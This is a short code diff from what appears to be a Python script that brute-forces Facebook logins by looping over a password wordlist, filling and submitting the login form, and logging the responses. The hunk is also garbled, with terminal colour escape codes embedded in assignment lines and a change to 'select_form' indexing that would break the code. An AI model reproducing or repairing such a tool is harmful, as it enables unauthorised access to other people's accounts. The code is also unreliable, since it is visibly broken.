@@ -62,8 +62,8 @@ for password in wordlist:
             fb = browser.open('https://facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
-            browser.form['email'] =\033[1;95m user\033[1;0m     
-            browser.form['pass'] =\033[1;95m password\033[1;0m     
+            browser.select_form['email'] =\033[1;95m user\033[1;0m     
+            browser.select_form['pass'] =\033[1;95m password\033[1;0m     
             browser.method = 'POST'
             browser.submit()
             dos.write(browser.open('https://facebook.com').read())
